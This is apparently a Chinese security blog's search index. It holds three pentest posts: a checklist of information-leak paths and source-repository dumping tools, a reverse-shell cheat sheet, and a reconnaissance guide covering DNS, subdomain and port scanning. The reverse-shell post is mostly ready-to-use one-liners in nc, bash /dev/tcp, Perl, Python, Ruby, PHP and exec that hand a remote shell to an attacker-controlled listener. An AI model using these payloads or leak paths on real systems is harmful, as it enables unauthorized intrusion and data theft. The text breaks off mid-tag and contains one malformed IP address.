<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>信息泄露总结</title>
    <url>/2019/06/15/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 18:55:39 GMT+0800 (GMT+08:00) --><p>在渗透测试过程中，由于网站配置不当，或者代码逻辑错误，往往会泄露一些敏感信息，本文对此做一个总结，欢迎各位补充。</p><h1 id="01、Apache样例文件泄露"><a href="#01、Apache样例文件泄露" class="headerlink" title="01、Apache样例文件泄露"></a>01、Apache样例文件泄露</h1><p>apache 的一些样例文件没有删除，可能存在可能存在cookie、session伪造，进行后台登录操作。常见的路径有：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;CookieExample</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;RequestHeaderExample</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;jsp&#x2F;snp&#x2F;snoop.jsp</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;async&#x2F;async1</span><br></pre></td></tr></table></figure><h1 id="02、IIS短文件名"><a href="#02、IIS短文件名" class="headerlink" title="02、IIS短文件名"></a>02、IIS短文件名</h1><p>工具：<a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a></p><p>利用：</p><p><img src="10-1560595853.jpg" alt="信息泄露总结"></p><h1 id="03、字段加-造成信息泄露"><a href="#03、字段加-造成信息泄露" class="headerlink" title="03、字段加[] 造成信息泄露"></a>03、字段加[] 造成信息泄露</h1><p>网站所有参数均存在，把参数变为数组即可报错出网站绝对路径。</p><p>比如：<img src="7-1560595854.jpg" alt="信息泄露总结"></p><h1 id="04、修改请求方法"><a href="#04、修改请求方法" class="headerlink" title="04、修改请求方法"></a>04、修改请求方法</h1><p>将get方法改为put 程序就报错，泄漏网站绝对路径。<br>比如：</p><p><img src="4-1560595854.jpg" alt="信息泄露总结"></p><p>当然，也可修改位其他方法，多fuzz。</p><h1 id="05、war文件信息泄露"><a href="#05、war文件信息泄露" class="headerlink" title="05、war文件信息泄露"></a>05、war文件信息泄露</h1><p>war文件信息泄露是指部署在war文件由于配置不当，导致其整个报文件以及其他重要的配置文件信息泄露，例如可以直接浏览目录，获取其下面的配置文件：WEB-INF/jdbc.properties,jdbc.properties为数据库链接配置文件。包含数据库链接的账户和密码等重要信息。<br>比如：</p><p><img src="1-1560595854.jpg" alt="信息泄露总结"></p><p>java 一般重要的配置文件位于 WEB-INF 目录下，其常见的重要的配置文件有：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config&#x2F;config.properties</span><br><span class="line">configure&#x2F;configure.properties</span><br><span class="line">applicationContext.xml</span><br><span class="line">sysconfig.properties</span><br><span class="line">web.xml</span><br><span class="line">config.xml</span><br><span class="line">jdbc.properties</span><br></pre></td></tr></table></figure><h1 id="06、swagger"><a href="#06、swagger" class="headerlink" title="06、swagger"></a>06、swagger</h1><p>常见路径：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;api&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;v1.x&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;index.html</span><br></pre></td></tr></table></figure><p><a href="https://datax.yahoo.com/%20/。然后我看到了以下页面。" target="_blank" rel="noopener">https://datax.yahoo.com/%20/。然后我看到了以下页面。</a></p><p><img src="5-1560595854.jpg" alt="信息泄露总结"></p><h1 id="07、Tomcat"><a href="#07、Tomcat" class="headerlink" title="07、Tomcat"></a>07、Tomcat</h1><p>tomcat 后缀改成大写，会显示源码，只要把jsp文件后缀名改为大写就可以</p><p>比如：</p><p><img src="4-1560595855.jpg" alt="信息泄露总结"></p><h1 id="08、阿里云oosaccesskey泄露"><a href="#08、阿里云oosaccesskey泄露" class="headerlink" title="08、阿里云oosaccesskey泄露"></a>08、阿里云oosaccesskey泄露</h1><p>上传文件处，在返回包中直接显示了阿里oss静态服务器的OSSAccessKeyId的值，导致信息泄漏 。</p><p><img src="5-1560595855.jpg" alt="信息泄露总结"></p><h1 id="09、j2ee应用异常信息"><a href="#09、j2ee应用异常信息" class="headerlink" title="09、j2ee应用异常信息"></a>09、j2ee应用异常信息</h1><p>Java异常处理机制（Exception）简要说明：Java中它是由Trowable类的两个子类的两大部分组成，Error类和Exception类。Error是不推荐捕获的（请查看Java异常处理机制中Error与Exception的区别），而Exception类除了子类RuntimeException是不能被捕获，其他子类的异常必须捕获，简单来讲，就产生异常信息了。</p><p>但Exception产生异常信息的过程有个特点，当发生异常时，<strong>异常抛给调用该函数的上一级函数</strong>，直到出现包含异常处理（catch）的层为止，这个给开发者在程序调试中带来很大的方便，能够快速定位问题所在等</p><p>形成XSS的场景：与上面场景不同的地方有两个：</p><p>1、如果开发者自己处理了异常信息但还是向用户抛出（在实际开发中这情况还不少，还做个用户体验页面，让用户把这些异常信息反馈给管理员（当然，开发者本意是好的！）。）</p><p>2、带有用户输入而又未做XSS防御处理的数据（攻击者的恶意代码）。</p><p><img src="4-1560595855-1.jpg" alt="信息泄露总结"></p><p><img src="1-1560595855.jpg" alt="信息泄露总结"></p><p>当然，如果最后默认是交给容器处理输出，是不会有这问题，如图：</p><p><img src="1-1560595856.jpg" alt="信息泄露总结"></p><h1 id="10、源代码泄露"><a href="#10、源代码泄露" class="headerlink" title="10、源代码泄露"></a>10、源代码泄露</h1><h2 id="1-Mercurial-hg-源码泄露"><a href="#1-Mercurial-hg-源码泄露" class="headerlink" title="(1).Mercurial .hg 源码泄露"></a>(1).Mercurial .hg 源码泄露</h2><p>hg在初始化代码库的时候，会在当前目录下面产生一个.hg的隐藏文件</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><p>工具：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rip-hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><h2 id="2-git-源码泄露"><a href="#2-git-源码泄露" class="headerlink" title="(2).git 源码泄露"></a>(2).git 源码泄露</h2><p>在运行 git init 的时候，在当前目录下会产生一个.git 文件。</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p>工具：Githack</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">githack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><h2 id="3-DS-Store-文件泄露"><a href="#3-DS-Store-文件泄露" class="headerlink" title="(3).DS_Store 文件泄露"></a>(3).DS_Store 文件泄露</h2><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F;</span><br></pre></td></tr></table></figure><p>工具：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;ds_store_exp</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-svn-源代码泄露"><a href="#4-svn-源代码泄露" class="headerlink" title="(4).svn 源代码泄露"></a>(4).svn 源代码泄露</h2><p>使用svn版本控制系统时，由于错误操作将.svn文件暴露在外网环境中，即可利用该文件还原出服务器源码、SVN服务器账号密码等信息。eg:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;entries</span><br></pre></td></tr></table></figure><p>工具：seay-Svn</p><h2 id="5-cvs文件泄露"><a href="#5-cvs文件泄露" class="headerlink" title="(5).cvs文件泄露"></a>(5).cvs文件泄露</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Root 返回根信息</span><br><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Entries 返回所有文件结构</span><br></pre></td></tr></table></figure><h2 id="6-bazaarbazaar信息泄露"><a href="#6-bazaarbazaar信息泄露" class="headerlink" title="(6).bazaarbazaar信息泄露"></a>(6).bazaarbazaar信息泄露</h2><p>bazaarbazaar是一个版本控制系统，可以追踪项目历史</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure><p>工具：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure><h2 id="7-WEB-INF-web-xml-泄露"><a href="#7-WEB-INF-web-xml-泄露" class="headerlink" title="(7).WEB-INF/web.xml 泄露"></a>(7).WEB-INF/web.xml 泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties</span><br></pre></td></tr></table></figure><h1 id="11、总结"><a href="#11、总结" class="headerlink" title="11、总结"></a>11、总结</h1><p>以上是笔者学习中遇到的，欢迎各位大佬继续补充。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>各种环境下反弹shell</title>
    <url>/2019/06/21/%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 18:55:39 GMT+0800 (GMT+08:00) --><h1 id="0x00-NC命令详解"><a href="#0x00-NC命令详解" class="headerlink" title="0x00 NC命令详解"></a>0x00 NC命令详解</h1><p>在介绍如何反弹shell之前，先了解相关知识要点。</p><p>nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流</p><p>可运行在TCP或者UDP模式，添加参数 —u 则调整为udP，默认为tcp，详细参数如下</p><ul><li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li><li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li><li>-h 在线帮助。</li><li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li><li>-l 使用监听模式，管控传入的资料。</li><li>-n 直接使用IP地址，而不通过域名服务器。</li><li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li><li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li><li>-r 乱数指定本地与远端主机的通信端口。</li><li>-s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。</li><li>-u 使用UDP传输协议。</li><li>-v 显示指令执行过程。</li><li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li><li>-z 使用0输入/输出模式，只在扫描通信端口时使用。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -v 172.31.100.7 21</span><br></pre></td></tr></table></figure><p>netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。</p><h2 id="1、使用nc聊天"><a href="#1、使用nc聊天" class="headerlink" title="1、使用nc聊天"></a>1、使用nc聊天</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc -l 1567</span><br></pre></td></tr></table></figure><p>netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc 172.31.100.7 1567</span><br></pre></td></tr></table></figure><p>不管你在机器B上键入什么都会出现在机器A上。</p><p>实测好像并不可以…</p><h2 id="2、nc进行文件传输"><a href="#2、nc进行文件传输" class="headerlink" title="2、nc进行文件传输"></a>2、nc进行文件传输</h2><p>Server:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc -l 1567 &lt; file.txt &#96;&#96;&#96; Client: &#96;&#96;&#96; $nc -n 172.31.100.7 1567 &gt; file.txt</span><br></pre></td></tr></table></figure><p>好像也不行…<br>不管这些还是直接来反弹shell吧</p><h1 id="0x01-NC"><a href="#0x01-NC" class="headerlink" title="0x01 NC"></a>0x01 NC</h1><h2 id="1、正向反弹shell"><a href="#1、正向反弹shell" class="headerlink" title="1、正向反弹shell"></a>1、正向反弹shell</h2><p>服务器端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>本地</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 192.168.242.129 7777</span><br></pre></td></tr></table></figure><p>即可获得服务器端的shell</p><h2 id="2、反向反弹shell"><a href="#2、反向反弹shell" class="headerlink" title="2、反向反弹shell"></a>2、反向反弹shell</h2><p>服务端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.242.1 7777</span><br></pre></td></tr></table></figure><p>本地</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure><p>不使用-e参数反弹<br>使用管道<br>服务端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod &#x2F;tmp&#x2F;backpipe p </span><br><span class="line">&#x2F;bin&#x2F;sh 0&#x2F;tmp&#x2F;backpipe</span><br></pre></td></tr></table></figure><p>攻击端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lnvp 7777</span><br></pre></td></tr></table></figure><p>mknod需要root用户，但是也可以通过mkfifo /tmp/backpipe也可以创建一个管道。</p><h1 id="0x02-Bash"><a href="#0x02-Bash" class="headerlink" title="0x02 Bash"></a>0x02 Bash</h1><p>服务端：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;sh -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;210.28.30.887&#x2F;53 0&gt;&amp;1&#39;</span><br><span class="line">或者</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.1&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>攻击端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure><h1 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h1><h2 id="第一种方式（linux）"><a href="#第一种方式（linux）" class="headerlink" title="第一种方式（linux）"></a>第一种方式（linux）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.242.1&quot;;$p&#x3D;7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; </span><br><span class="line">本地：nc -nvlp 7777</span><br></pre></td></tr></table></figure><h2 id="第二种方式（linux）"><a href="#第二种方式（linux）" class="headerlink" title="第二种方式（linux）"></a>第二种方式（linux）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;192.168.242.1:7777&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><h2 id="第三种方式（windwos）"><a href="#第三种方式（windwos）" class="headerlink" title="第三种方式（windwos）"></a>第三种方式（windwos）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#39;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><h1 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.27.32.227&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; </span><br><span class="line">本地：nc -nvlp 7777</span><br></pre></td></tr></table></figure><h1 id="0x05-ruby"><a href="#0x05-ruby" class="headerlink" title="0x05 ruby"></a>0x05 ruby</h1><h2 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)</span><br></pre></td></tr></table></figure><p>一次性连接，连上就断，换上 msd 监听也是这样</p><h2 id="第二种（linux）"><a href="#第二种（linux）" class="headerlink" title="第二种（linux）"></a>第二种（linux）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)</span><br></pre></td></tr></table></figure><p>一次性连接，连上就断，换上 msf 监听也是这样</p><h2 id="第三种方式（windwos）-1"><a href="#第三种方式（windwos）-1" class="headerlink" title="第三种方式（windwos）"></a>第三种方式（windwos）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;c&#x3D;TCPSocket.new(&quot;10.10.10.166&quot;,&quot;4444&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure><h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.10.10.166&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line">本地  nc -nvlp 4444</span><br></pre></td></tr></table></figure><h1 id="0x07-exec"><a href="#0x07-exec" class="headerlink" title="0x07 exec"></a>0x07 exec</h1><h2 id="第一种方式-1"><a href="#第一种方式-1" class="headerlink" title="第一种方式"></a>第一种方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444</span><br><span class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line">本地：nc -nvlp 4444</span><br></pre></td></tr></table></figure><h2 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444; sh &lt;&amp;196&gt;&amp;196 2&gt;&amp;196 </span><br><span class="line">本地 nc -nvlp 4444</span><br></pre></td></tr></table></figure><h1 id="0x08-原生的-shell-切换交互式-bash"><a href="#0x08-原生的-shell-切换交互式-bash" class="headerlink" title="0x08 原生的 shell 切换交互式 bash"></a>0x08 原生的 shell 切换交互式 bash</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -nvlp 4444 </span><br><span class="line">listening on [any] 4444 ... </span><br><span class="line">connect to [10.10.10.166] from (UNKNOWN) [10.10.10.50] 39840 </span><br><span class="line">$ $ $  </span><br><span class="line">$ python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; </span><br><span class="line">kevin@ubuntu:~$</span><br></pre></td></tr></table></figure><h1 id="0x09-最后"><a href="#0x09-最后" class="headerlink" title="0x09 最后"></a>0x09 最后</h1><p>个人觉得这几种应该就够用了，至于其他环境，再看具体情况吧，有一些环境服务器不一定有的</p><p>参考链接：</p><p><a href="https://www.cnblogs.com/deen-/p/7237327.html" target="_blank" rel="noopener">https://www.cnblogs.com/deen-/p/7237327.html</a></p><p><a href="https://blog.csdn.net/Kevinhanser/article/details/88920278" target="_blank" rel="noopener">https://blog.csdn.net/Kevinhanser/article/details/88920278</a></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透技巧</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集</title>
    <url>/2019/06/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 18:55:39 GMT+0800 (GMT+08:00) --><h1 id="一、DNS"><a href="#一、DNS" class="headerlink" title="一、DNS"></a>一、DNS</h1><h2 id="1、A记录"><a href="#1、A记录" class="headerlink" title="1、A记录"></a>1、A记录</h2><ul><li>ping nslookup</li><li>dig 域名</li><li>dig -t a baidu.com</li></ul><h2 id="2、NS记录（DNS服务器）"><a href="#2、NS记录（DNS服务器）" class="headerlink" title="2、NS记录（DNS服务器）"></a>2、NS记录（DNS服务器）</h2><ul><li>dig -t NS 域名</li></ul><h2 id="3、MX记录（邮件服务器）"><a href="#3、MX记录（邮件服务器）" class="headerlink" title="3、MX记录（邮件服务器）"></a>3、MX记录（邮件服务器）</h2><ul><li>dig -t MX baidu.com</li></ul><h2 id="4、CNAME记录（别名）"><a href="#4、CNAME记录（别名）" class="headerlink" title="4、CNAME记录（别名）"></a>4、CNAME记录（别名）</h2><ul><li>dig -t CNAME baidu.com</li></ul><h2 id="5、whois查询（域名信息查询）"><a href="#5、whois查询（域名信息查询）" class="headerlink" title="5、whois查询（域名信息查询）"></a>5、whois查询（域名信息查询）</h2><p><a href="http://whois.chinaz.com" target="_blank" rel="noopener">whois.chinaz.com</a><br><a href="http://whois.iana.org" target="_blank" rel="noopener">whois.iana.org</a><br><a href="http://www.arin.net" target="_blank" rel="noopener">www.arin.net</a><br><a href="http://who.is" target="_blank" rel="noopener">who.is</a><br><a href="http://centralops.net/co/" target="_blank" rel="noopener">centralops.net</a><br><a href="http://www.17ce.com" target="_blank" rel="noopener">www.17ce.com</a></p><h1 id="二、子域名"><a href="#二、子域名" class="headerlink" title="二、子域名"></a>二、子域名</h1><h2 id="1、爆破"><a href="#1、爆破" class="headerlink" title="1、爆破"></a>1、爆破</h2><ul><li>dnsmap baidu.com -w 字典dnsmap默认字典 /usr/share/dnsmap/wordlist_TLAs.txt</li><li>fuzzDomain 工具</li><li>Layer子域名挖掘机</li></ul><h2 id="2、搜索引擎"><a href="#2、搜索引擎" class="headerlink" title="2、搜索引擎"></a>2、搜索引擎</h2><ul><li>google hacker 语法<br><code>site:baidu.com</code></li></ul><h2 id="3、kali下："><a href="#3、kali下：" class="headerlink" title="3、kali下："></a>3、kali下：</h2><ul><li>theharvester<br>proxychains theharvester -d baidu.com -b all<br>proxychains 加代理</li><li>AQUATONE工具<br>发现 proxychains aquatone-discover -d 域名 -t 10（线程）<br>扫描 proxychains aquatone-scan-d 域名 -t 10（线程）<br>收集 proxychains aquatone-gather -d 域名 -t 10（线程）</li></ul><h2 id="4、域传送"><a href="#4、域传送" class="headerlink" title="4、域传送"></a>4、域传送</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fierce -dns  baidu.com   （域名有DNS服务器才能用）</span><br></pre></td></tr></table></figure><h2 id="5、在线网站"><a href="#5、在线网站" class="headerlink" title="5、在线网站"></a>5、在线网站</h2><p><a href="http://www.virustotal.com" target="_blank" rel="noopener">www.virustotal.com</a><br><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">dnsdumpster.com</a><br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">phpinfo.me</a></p><h1 id="三、C段"><a href="#三、C段" class="headerlink" title="三、C段"></a>三、C段</h1><h2 id="1、Namp扫描"><a href="#1、Namp扫描" class="headerlink" title="1、Namp扫描"></a>1、Namp扫描</h2><p>Nmap-扫描C段主机存活</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sn -PE -n 192.168.1.1&#x2F;24 -oX out.xml</span><br><span class="line">    -sn不扫描端口</span><br><span class="line">    -PE ICMP扫描</span><br><span class="line">    -n不进行dns解析</span><br></pre></td></tr></table></figure><p>Nmap-定向端口扫描</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sS -Pn -p 3389 ip</span><br><span class="line">    扫描方式：半开放扫描</span><br><span class="line">    -Pn 不进行主机存活探测</span><br></pre></td></tr></table></figure><p>Nmap-全端口扫描</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sS -Pn -p 1-65535 -n ip</span><br><span class="line">    扫描方式：半开放扫描</span><br></pre></td></tr></table></figure><p>Nmap-服务扫描</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sS -sV -p 1-65535 -n ip</span><br><span class="line">    扫描方式：半开放扫描</span><br><span class="line">    显示出端口开发的服务</span><br></pre></td></tr></table></figure><h2 id="2、Masscan"><a href="#2、Masscan" class="headerlink" title="2、Masscan"></a>2、Masscan</h2><p>Masscan-安装</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git gcc make libpcap-dev（安装必备环境，kali已经默认安装完成）</span><br><span class="line">git clone</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br><span class="line">cd masscan</span><br><span class="line">make（编译）</span><br></pre></td></tr></table></figure><p>Masscan-使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Masscan -p 80  192.168.1.1&#x2F;24  --rate 1000  -oL  output.txt</span><br><span class="line">    -p设置端口</span><br><span class="line">    --rate发包速率</span><br><span class="line">    -oL输出位置</span><br><span class="line">为了绕过扫描特定ip，可以添加-excludefile </span><br><span class="line">Masscan-p 80 ip --excludefile special.txt</span><br><span class="line">    自定多种格式输出</span><br><span class="line">    -oX输出xml</span><br><span class="line">    -oJ输出json格式</span><br><span class="line">    -oL输出简单列表</span><br></pre></td></tr></table></figure><p>Masscan-注意问题</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">扫描选项中必须添加端口-p、--ports 1-65535</span><br><span class="line">目标主机是IP地址，不是域名</span><br></pre></td></tr></table></figure><p>Masscan-总结</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Masscan&#x3D;&#x3D;namp-sS-Pn-n-randomize-hosts-send-eth</span><br><span class="line">速率：可以执行最高300、000个数据包每秒</span><br><span class="line">注册账号能找到服务器地址</span><br></pre></td></tr></table></figure><h1 id="四、web目录扫描"><a href="#四、web目录扫描" class="headerlink" title="四、web目录扫描"></a>四、web目录扫描</h1><h2 id="1、robots-txt文件"><a href="#1、robots-txt文件" class="headerlink" title="1、robots.txt文件"></a>1、robots.txt文件</h2><p><a href="https://baidu.com/robots.txt" target="_blank" rel="noopener">https://baidu.com/robots.txt</a></p><h2 id="2、搜索引擎-1"><a href="#2、搜索引擎-1" class="headerlink" title="2、搜索引擎"></a>2、搜索引擎</h2><p>site: baidu.com</p><h2 id="3、爆破"><a href="#3、爆破" class="headerlink" title="3、爆破"></a>3、爆破</h2><ul><li><p>dirb (kali下)</p></li><li><p>ddirb <a href="https://baidu.com" target="_blank" rel="noopener">https://baidu.com</a></p><p>爆破一DIRB</p><p>参数：</p><ul><li>设置User-Agent</li><li>-b不扫描./或者./</li><li>-c设置Cookie</li><li>-E设置证书文件</li><li>-o outfile_file保存扫描文件</li></ul></li><li><p>dirbuster（kali下） （不推荐，已经停止更新）</p></li></ul><h2 